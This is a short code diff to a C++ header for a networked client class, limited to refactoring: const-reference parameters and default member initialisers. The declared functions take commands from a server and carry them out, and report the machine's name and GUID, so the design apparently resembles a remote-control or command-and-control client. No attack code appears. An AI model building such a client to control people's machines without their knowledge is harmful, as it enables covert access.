@@ -41,13 +41,13 @@ public:
     ~Client();
     BOOL               Connect();                   // Connect to the tcp server
     BOOL               Disconnect();                // Disconnect from the tcp server
-    BYTESTRING         MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
-    BOOL               SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
-    BOOL               SendEncryptedMessageToServer(Server dest, ClientMessage message);
+    BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
+    BOOL               SendMessageToServer(const Server& dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
+    BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               SendComputerNameToServer();
     template <typename _Ty>
-    BOOL               ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
+    BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
 private:
     void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
@@ -55,7 +55,7 @@ private:
     BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
     BOOL               SendMachineGUIDToServer();
 
-    ProcessManager     Remote;                      // remote host process manager
+    ProcessManager     Remote = {};                      // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
     Server             m_UDPServerDetails = {};
 
@@ -83,7 +83,7 @@ public:
         that sets expecting response to true and consistantly checks recent client response
         against last client response, waiting for a new client response.
     */
-    BOOL               ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
+    BOOL               ExpectingResponse = FALSE; // Expecting a ClientResponse from a client not a clientREQUEST
     ClientResponse     RecentClientResponse;
     ClientResponse     LastClientResponse;
 #endif
